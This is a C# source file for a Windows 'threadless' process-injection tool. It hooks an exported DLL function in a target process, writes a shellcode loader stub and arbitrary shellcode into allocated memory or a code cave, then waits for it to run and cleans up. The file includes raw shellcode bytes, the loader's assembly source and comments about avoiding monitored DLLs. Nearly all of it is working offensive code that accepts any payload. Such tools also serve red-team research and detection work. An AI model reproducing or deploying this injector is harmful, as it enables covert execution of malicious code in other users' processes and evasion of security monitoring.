using Mono.Options;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ThreadlessInject;

using static Native;
using static Win32;

public class RemoteModuleInfo
{
    public ulong BaseAddress { get; set; }
    public string FullPath { get; set; }
    public uint Size { get; set; }
}

public class RemoteCaveInfo
{
    public ulong BaseAddress { get; set; }
    public string FullPath { get; set; }
    public byte[] OriginalCode { get; set; }
}

public static class RemoteProcesser
{
    private struct MODULEINFO
    {
        public IntPtr lpBaseOfDll;
        public uint SizeOfImage;
        public IntPtr EntryPoint;
    }

    [DllImport("psapi.dll", SetLastError = true)]
    private static extern bool EnumProcessModulesEx(
        IntPtr hProcess,
        [Out] IntPtr[] lphModule,
        uint cb,
        out uint lpcbNeeded,
        uint dwFilterFlag);

    [DllImport("psapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern uint GetModuleFileNameEx(
        IntPtr hProcess,
        IntPtr hModule,
        StringBuilder lpBaseName,
        nint nSize);


    [DllImport("psapi.dll", SetLastError = true)]
    private static extern bool GetModuleInformation(
            IntPtr hProcess,
            IntPtr hModule,
            out MODULEINFO lpmodinfo,
            uint cb);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int nSize,
        out int lpNumberOfBytesRead);
    private const uint LIST_MODULES_ALL = 0x03;

    private static NTSTATUS QueryRemoteProcessModules(IntPtr hProcess, out List<RemoteModuleInfo> modules)
    {
        modules = new List<RemoteModuleInfo>();

        if (!EnumProcessModulesEx(hProcess, null, 0, out uint needed, LIST_MODULES_ALL))
        {
            return NTSTATUS.Unsuccessful;
        }

        int numModules = (int)(needed / IntPtr.Size);
        IntPtr[] hModules = new IntPtr[numModules];

        if (!EnumProcessModulesEx(hProcess, hModules, needed, out needed, LIST_MODULES_ALL))
        {
            return NTSTATUS.Unsuccessful;
        }

        StringBuilder pathBuilder = new StringBuilder(260);
        foreach (var hMod in hModules)
        {
            if (hMod == IntPtr.Zero) continue;

            // query remote module info (BaseAddress, SizeOfImage)
            if (!GetModuleInformation(hProcess, hMod, out MODULEINFO modInfo, (uint)Marshal.SizeOf<MODULEINFO>()))
            {
                continue;
            }

            pathBuilder.Clear();
            if (GetModuleFileNameEx(hProcess, hMod, pathBuilder, 260) > 0)
            {
                modules.Add(new RemoteModuleInfo
                {
                    BaseAddress = (ulong)modInfo.lpBaseOfDll.ToInt64(),
                    FullPath = pathBuilder.ToString(),
                    Size = modInfo.SizeOfImage
                });
            }
        }

        return NTSTATUS.Success;
    }

    // skips the main exe, as well as heavily monitored Dlls like ntdll.dll, kernel32.dll, kernelbase.dll
    public static RemoteCaveInfo FindCodeCave(IntPtr hProcess, int requiredSize, bool randomSearchOrder)
    {
        var status = QueryRemoteProcessModules(hProcess, out var modules);
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to query remote process modules: {status}");
        }

        if (randomSearchOrder) // fish my yates shuffle
        {
            var rng = new Random();
            int n = modules.Count;
            while (n > 1)
            {
                int k = rng.Next(n--);
                (modules[n], modules[k]) = (modules[k], modules[n]); // use tuples, idk C#
            }
        }

        for (int i = 0; i < modules.Count; i++)
        {
            var module = modules[i];
            if (module.FullPath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
                module.FullPath.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase) ||
                module.FullPath.EndsWith("kernel32.dll", StringComparison.OrdinalIgnoreCase) ||
                module.FullPath.EndsWith("kernelbase.dll", StringComparison.OrdinalIgnoreCase))
            {
                continue;
            }

            // read the entire module image into a local buffer
            byte[] moduleBytes = new byte[module.Size];
            uint bytesToRead = module.Size;
            var buf = Marshal.AllocHGlobal((IntPtr)bytesToRead);
            NTSTATUS st = ReadVirtualMemory(
                hProcess,
                (IntPtr)module.BaseAddress,
                buf,
                (uint)bytesToRead,
                out var bytesRead);

            if (st != NTSTATUS.Success || bytesRead != bytesToRead)
            {
                Console.WriteLine($"[!] Failed to read module memory of {module.FullPath}, skipping");
                Marshal.FreeHGlobal(buf);
                continue;
            }
            Marshal.Copy(buf, moduleBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(buf);

            // Parse PE headers to find executable sections in current module
            List<(uint SectionRVA, uint Size, uint Characteristics)> executableSections = new List<(uint, uint, uint)>();
            try
            {
                int e_lfanew = BitConverter.ToInt32(moduleBytes, 0x3C);
                ushort numberOfSections = BitConverter.ToUInt16(moduleBytes, e_lfanew + 6);
                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(moduleBytes, e_lfanew + 20);
                int sectionHeaderOffset = e_lfanew + 24 + sizeOfOptionalHeader;

                const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;

                for (int s = 0; s < numberOfSections; s++)
                {
                    int currentHeader = sectionHeaderOffset + (s * 40);
                    uint size = BitConverter.ToUInt32(moduleBytes, currentHeader + 8);
                    uint virtualAddress = BitConverter.ToUInt32(moduleBytes, currentHeader + 12);
                    uint characteristics = BitConverter.ToUInt32(moduleBytes, currentHeader + 36);

                    if ((characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
                    {
                        executableSections.Add((virtualAddress, size, characteristics));
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to parse PE headers for {module.FullPath}: {ex.Message}, trying next module...");
                continue;
            }
            Console.WriteLine($"[:] Got {executableSections.Count()} exec sections in current module {module.FullPath} at 0x{module.BaseAddress:x}");

            // scan for contiguous padding bytes
            int consecutiveCount = 0;
            uint candidateEndRVA = 0;
            uint dontOverwriteStart = 0x100; // skip the first 256 bytes of the module to avoid overwriting important stuff
            byte[] paddingBytes = new byte[] { 0x00, 0x90, 0xCC };

            for (int e = 0; e < executableSections.Count(); e++)
            {
                var section = executableSections[e];
                Console.WriteLine($"[.] Checking 0x{(module.BaseAddress + section.SectionRVA):x}");

                // start from the end of the module (junk is located there) and scan back
                for (uint b = section.Size - 1; b >= dontOverwriteStart; b--)
                {
                    uint currentRVA = section.SectionRVA + b;
                    byte currentByte = moduleBytes[currentRVA];
                    if (paddingBytes.Contains(currentByte))
                    {
                        if (consecutiveCount == 0)
                        {
                            candidateEndRVA = currentRVA;
                        }

                        consecutiveCount++;

                        if (consecutiveCount >= requiredSize) // && candidateEndRVA >= requiredSize - dontOverwriteStart (implied)
                        {
                            uint candidateStartRVA = candidateEndRVA - (uint)requiredSize + 1;
                            ulong caveAddress = module.BaseAddress + candidateStartRVA;

                            // dump the original bytes
                            byte[] caveChunk = new byte[requiredSize];
                            Array.Copy(moduleBytes, candidateStartRVA, caveChunk, 0, requiredSize);
                            //Console.WriteLine($"[=] Cave bytes: {BitConverter.ToString(caveChunk).Replace("-", " ")}");

                            return new RemoteCaveInfo
                            {
                                BaseAddress = caveAddress,
                                FullPath = module.FullPath,
                                OriginalCode = caveChunk
                            };
                        }
                    } 
                    else
                    {
                        consecutiveCount = 0;
                        candidateEndRVA = 0;
                    }
                }
            }
        }
        return new RemoteCaveInfo();
    }
}

internal static class Program
{
    // default x64 calc shellcode with ret (trust me bro)
    private static readonly byte[] CalcX64 =
    {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
    };

    private static readonly byte[] ShellcodeLoader =
    {
        /* 0000 */ 0x56, 0x53, 0x48, 0xBB, 0x44, 0x44, 0x33, 0x33, 0x22, 0x22, 0x11, 0x11, 0x48, 0xBE, 0x88, 0x88, 
        /* 0010 */ 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 
        /* 0020 */ 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 
        /* 0030 */ 0xD6, 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 
        /* 0040 */ 0x09, 0x09, 0x09, 0x89, 0x43, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 
        /* 0050 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xEC, 
        /* 0060 */ 0x18, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x48, 0x8B, 0xCB, 0x5B, 0x5E, 0xFF,
        /* 0070 */ 0xE1
    };
    
    private static IntPtr GetModuleHandle(string dll)
    {
        using var self = Process.GetCurrentProcess();
        
        foreach (ProcessModule module in self.Modules)
        {
            if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
                continue;

            return module.BaseAddress;
        }
        
        return IntPtr.Zero;
    }

    private static void GenerateHook(long originalInstructions_0_8, int originalInstructions_8_B, long hookedFuncAddr, long virtProtAddr)
    {
        // This function generates a shellcode loader stub that executes the following sequence:
        // - Saves volatile registers and loads runtime-patched addresses for the hooked function and VirtualProtect.
        // - Unprotects the hooked function (RWX), restores its original 12-byte prologue, and reprotects it (RX).
        // - Executes the inline shellcode payload (relative call to +11h, as shellcode is just appended).
        // - Restores registers and returns control to the original function via (indirect) pop rcx, jmp rcx
        //
        // How to re-assemble the shellcode loader:
        // - Save the shellcode stub.asm file
        // - When VS 2026 installed, open x64 Native Tools Command Prompt for VS 2026
        //   - ml64 /c /nologo stub.asm && dumpbin /rawdata stub.obj > stub.dump 
        //   - Then use this shitty PowerShell command to extract the raw bytes (or copy manually like a peasant)
        //     - "0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")
        // - Else download NASM 
        //   - nasm -f win64 stub.asm -o stub.obj
        //   - Get-Content stub.obj -Encoding Byte | ForEach-Object { "0x{0:X2}" -f $_ }

        /*
        .code

        MyStub PROC

            ; ==========================================
            ; PROLOG: Save registers
            ; ==========================================
            push rsi
            push rbx
            mov rbx, 1111222233334444h    ; Store hookedFunc in rbx (patched at runtime)
            mov rsi, 5555666677778888h    ; Store VirtualProtect in rsi (patched at runtime)

            ; ==========================================
            ; VIRTUALPROTECT (Change to RWX)
            ; ==========================================
            sub rsp, 28h                  ; Allocate shadow space 20h + 8 for oldProtect
            mov rcx, rbx                  ; Arg 1: hookedFunc
            mov rdx, 12                   ; Arg 2: Size
            mov r8, 40h                   ; Arg 3: PAGE_EXECUTE_READWRITE (0x40)
            lea r9, [rsp]                 ; Arg 4: oldProtect pointer
            call rsi                      ; Call VirtualProtect
            ; leave old shadow space

            ; ==========================================
            ; RESTORE ORIGINAL 12 BYTES in hooked func
            ; ==========================================
            mov rax, 9999AAAACCCCDDDDh    ; First 8 bytes of original prologue (patched at runtime)
            mov QWORD PTR [rbx], rax      ; Write bytes to [rbx]
            mov eax, 09090909h            ; Next 4 bytes of original prologue (patched at runtime)
            mov DWORD PTR [rbx + 8], eax  ; Write bytes to [rbx + 8]

            ; ==========================================
            ; VIRTUALPROTECT (Change back to RX)
            ; ==========================================
            ; reuse old shadow space from above
            mov rcx, rbx            ; Arg 1: hookedFunc
            mov rdx, 12             ; Arg 2: Size
            mov r8, 20h             ; Arg 3: PAGE_EXECUTE_READ (0x20)
            lea r9, [rsp]           ; Arg 4: oldProtect pointer
            call rsi                ; Call VirtualProtect

            ; ==========================================
            ; CALL THE SHELLCODE
            ; ==========================================
            sub rsp, 18h            ; Allocate shadow space (-40h+28h from before)
            call Payload            ; Call the actual supplied payload (call +11h)
            add rsp, 40h            ; Clean up stack

            ; ==========================================
            ; EPILOG: Restore and exit
            ; ==========================================
            mov rcx, rbx            ; rbx still holds final return dest, but rbx must be restored now
            pop rbx
            pop rsi
            jmp rcx                 ; jmp back to hookedFuncAddr (rcx is volatile, and we start again atop a function, should be clean)

        MyStub ENDP

        ; ==========================================
        ; INLINE PAYLOAD BLOCK
        ; ==========================================
        Payload PROC
            ; inserted dynamically
        Payload ENDP

        END
        */

        using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));

        // Patch the hooked function address into the shellcode loader stub
        writer.Seek(0x04, SeekOrigin.Begin);
        writer.Write(hookedFuncAddr);
        writer.Flush();

        // Patch the VirtualProtect address into the shellcode loader stub
        writer.Seek(0x0E, SeekOrigin.Begin);
        writer.Write(virtProtAddr);
        writer.Flush();

        // Patch the 12 bytes that were in the original export prior to hooking
        writer.Seek(0x33, SeekOrigin.Begin);
        writer.Write(originalInstructions_0_8);
        writer.Seek(0x3F, SeekOrigin.Begin);
        writer.Write(originalInstructions_8_B);
        writer.Flush();
    }

    private static byte[] ReadPayload(string path)
    {
        if (File.Exists(path))
        {
            return File.ReadAllBytes(path);
        }

        Console.WriteLine("[=] Shellcode argument doesn't appear to be a file, assuming Base64");
        return Convert.FromBase64String(path);
    }

    private static byte[] LoadShellcode(string path)
    {
        byte[] shellcode;

        if (path == null)
        {
            Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
            shellcode = CalcX64;
        }
        else
        {
            shellcode = ReadPayload(path);
        }

        return shellcode;
    }

    public static void Main(string[] args)
    {
        var showHelp = false;
        string shellcodeStr = null;
        string dll = null;
        string export = null;
        var pid = 0;
        bool searchCodeCave = false;
        bool randomDllSearch = false;

        var optionSet = new OptionSet()
            .Add("h|help", "Display this help", v => showHelp = v != null)
            .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)",
                v => shellcodeStr = v)
            .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
            .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
            .Add("e=|export=", "The exported function that will be hijacked", v => export = v)
            .Add("c|codecave", "Search a code cave in the target process to store the shellcode (default: false)", v => searchCodeCave = v != null)
            .Add("r|randomcave", "Search DLLs in random order for a code cave (default: load order)", v => randomDllSearch = v != null);

        try
        {
            optionSet.Parse(args);

            if (dll == null || pid == 0 || export == null)
            {
                Console.WriteLine("[!] pid, dll and export arguments are required");
                showHelp = true;
            }

            if (showHelp)
            {
                optionSet.WriteOptionDescriptions(Console.Out);
                return;
            }

        }
        catch (Exception e)
        {
            Console.WriteLine($"[!] Failed to parse arguments: {e.Message}");
            optionSet.WriteOptionDescriptions(Console.Out);
            return;
        }

        var hModule = GetModuleHandle(dll);

        if (hModule == IntPtr.Zero)
            hModule = LoadLibrary(dll);

        if (hModule == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
            return;
        }

        var exportAddress = GetProcAddress(hModule, export);
        if (exportAddress == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
            return;
        }

        Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");

        var status = OpenProcess(pid, out var hProcess);
        if (status != 0 || hProcess == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to open PID {pid}: {status}.");
            return;
        }

        Console.WriteLine($"[=] Opened process with id {pid}");

        var shellcode = LoadShellcode(shellcodeStr);
        IntPtr loaderAddress = IntPtr.Zero;
        int loaderTotalSize = ShellcodeLoader.Length + shellcode.Length;

        // check if search code cave is enabled and one is found
        bool foundCodeCave = false;
        RemoteCaveInfo CodeCave = new RemoteCaveInfo();
        if (searchCodeCave)
        {
            // try to find "unused" code, else fall back to AllocMem
            CodeCave = RemoteProcesser.FindCodeCave(hProcess, loaderTotalSize, randomDllSearch);
            if (CodeCave.BaseAddress == 0 || CodeCave.OriginalCode.Length != loaderTotalSize)
            {
                Console.WriteLine($"[!] No suitable code cave found of the requested size {loaderTotalSize}, falling back to allocation");
            }
            else
            {
                loaderAddress = (IntPtr)CodeCave.BaseAddress;
                Console.WriteLine($"[=] Found code cave of size {loaderTotalSize} at 0x{(ulong)loaderAddress:x}");
            }
        }

        if (loaderAddress == IntPtr.Zero)
        {
            NTSTATUS st = AllocateVirtualMemory(hProcess, ref loaderAddress, (IntPtr)loaderTotalSize);
            if (st != NTSTATUS.Success)
            {
                Console.WriteLine("[!] Failed to allocate memory in the remote process");
                return;
            }
            Console.WriteLine($"[=] Allocated loader and shellcode at 0x{(ulong)loaderAddress:x} within PID {pid}");
        }

        var kernel32Handle = GetModuleHandle("kernel32.dll");
        if (kernel32Handle == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get handle to kernel32.dll");
            return;
        }
        var virtProtAddr = GetProcAddress(kernel32Handle, "VirtualProtect");
        if (virtProtAddr == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get address of VirtualProtect");
            return;
        }

        // get the original 12 bytes of the to-be-overwritten export function
        var originalBytes_0_8 = Marshal.ReadInt64(exportAddress);
        var originalBytes_8_B = Marshal.ReadInt32(exportAddress + 0x8);
        GenerateHook(originalBytes_0_8, originalBytes_8_B, (long)exportAddress, (long)virtProtAddr);

        // overwrite with the new 12 bytes to call the loader stub
        var callOpCode = new byte[] {
            0x48, 0xB8,                  // 0x00..0x02  movabs rax, XXXX
            0, 0, 0, 0, 0, 0, 0, 0,      // 0x02..0x0a  full 8-bytes addressing (where the loader may be)
            0xFF, 0xE0                   // 0x0a..0x0c  jmp rax
        };
        // Copy the 8-byte address to the shellcode loader into indices 2 through 9
        BitConverter.GetBytes(loaderAddress.ToInt64()).CopyTo(callOpCode, 2);

        // write the hook (call) to the loader stub
        status = ProtectVirtualMemory(
            hProcess,
            exportAddress,
            (uint)callOpCode.Length,
            MemoryProtection.ExecuteReadWrite,
            out var oldProtectHook);
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to unprotect hook address 0x{exportAddress}:x to RWX");
            return;
        }

        status = WriteVirtualMemory(
            hProcess,
            exportAddress,
            callOpCode,
            out var bytesWritten);

        if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
        {
            Console.WriteLine($"[!] Failed to write hook op code to 0x{exportAddress:x}: {status}");
            return;
        }
        
        status = ProtectVirtualMemory(
            hProcess,
            exportAddress,
            (uint)callOpCode.Length,
            oldProtectHook,
            out _);
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to  re-protect hook address 0x{exportAddress}:x back to RX");
            return;
        }

        // write the shellcode loader stub + shellcode to the remote process (code cave or allocated)
        var payload = ShellcodeLoader.Concat(shellcode).ToArray();

        status = ProtectVirtualMemory(
            hProcess,
            loaderAddress,
            (uint)payload.Length,
            MemoryProtection.ReadWrite,
            out var oldProtectLoader);
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to unprotect loader address 0x{(ulong)loaderAddress:x} to RWX");
            return;
        }

        status = WriteVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            payload,
            out bytesWritten);
        if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
        {
            Console.WriteLine($"[!] Failed to write loader+shellcode to 0x{(ulong)loaderAddress:x}: {status}");
            return;
        }
        
        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            oldProtectLoader,
            out _);
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to re-protect loader address 0x{(ulong)loaderAddress:x} back to RX");
            return;
        }

        // and finally wait for execution
        var timer = new Stopwatch();
        int timeout = 60;
        timer.Start();
        var executed = false;

        Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");

        while (timer.Elapsed.TotalSeconds < timeout)
        {
            var bytesToRead = 12;
            var buf = Marshal.AllocHGlobal(bytesToRead);
            
            status = ReadVirtualMemory(
                hProcess,
                exportAddress,
                buf,
                (uint)bytesToRead,
                out var bytesRead);
            if (status != NTSTATUS.Success)
            {
                executed = false;
                Console.WriteLine($"[!] Cannot read back hook addr at 0x{(ulong)exportAddress:x} in remote proc, aborting");
                break; // something is wrong with the remote proc, abort
            }

            var temp = new byte[bytesRead];
            Marshal.Copy(buf, temp, 0, bytesToRead);
            var currentBytes_0_8 = BitConverter.ToInt64(temp, 0);
            var currentBytes_8_B = BitConverter.ToInt32(temp, 8);   

            // original bytes are restored at the start of the shellcode payload -> can only match again if shellcode executed
            if (originalBytes_0_8 == currentBytes_0_8 && originalBytes_8_B == currentBytes_8_B)
            {
                executed = true;
                break;
            }

            Thread.Sleep(1000);
        }

        timer.Stop();

        if (executed)
        {
            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s and export is restored");

            if (foundCodeCave) // remove shellcode again from code cave
            {
                status = ProtectVirtualMemory(
                    hProcess,
                    loaderAddress,
                    (uint)loaderTotalSize,
                    MemoryProtection.ExecuteReadWrite,
                    out var oldProtectCave);
                if (status != NTSTATUS.Success)
                {
                    Console.WriteLine($"[!] Failed to unprotect code cave at 0x{(ulong)loaderAddress:x}");
                    return;
                }
                status = WriteVirtualMemory(
                    hProcess,
                    loaderAddress,
                    CodeCave.OriginalCode,
                    out var bytesWrittenRe);
                if (status != NTSTATUS.Success)
                { 
                    Console.WriteLine($"[!] Failed to restore code cave at 0x{(ulong)loaderAddress:x}");
                    return;
                }
                status = ProtectVirtualMemory(
                    hProcess,
                    loaderAddress,
                    (uint)loaderTotalSize,
                    oldProtectCave,
                    out _);
                if (status != NTSTATUS.Success)
                {
                    Console.WriteLine($"[!] Failed to protect code cave at 0x{(ulong)loaderAddress:x}");
                    return;
                }

                Console.WriteLine($"[+] Restored original bytes of code cave at 0x{(ulong)loaderAddress:x}");

            } 
            else
            {
                // no code cave -> just free the allocated (loader) memory
                FreeVirtualMemory(
                    hProcess,
                    loaderAddress);
            }

        }
        else
        {
            Console.WriteLine($"[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up shellcode at 0x{(ulong)loaderAddress:x}");
        }

        CloseHandle(hProcess);
    }
}